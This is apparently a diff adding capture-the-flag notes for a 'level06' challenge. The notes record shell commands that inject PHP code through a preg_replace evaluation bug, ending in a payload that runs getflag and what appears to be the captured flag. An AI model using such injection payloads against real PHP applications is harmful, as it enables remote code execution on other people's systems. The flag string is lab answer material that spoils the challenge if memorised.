@@ -1,0 +1,26 @@
+echo '${eval("pwd");}' > /tmp/lv
+cat /tmp/lv
+
+./level06 /tmp/lv
+
+link: https://www.yeahhub.com/code-execution-preg_replace-php-function-exploitation/
+
+========
+
+echo start [x a.[b]@c] end > /tmp/lv
+./level06 /tmp/lv
+    start a x (b) yc end
+
+========
+
+[x eval("pwd");]
+echo '[x eval("pwd");]' > /tmp/lv
+./level06 /tmp/lv
+
+========= good =
+
+echo "[x \${\`getflag\`}]" > /tmp/lv
+cat /tmp/lv
+./level06 /tmp/lv
+
+wiok45aaoguiboiki2tuin6ub
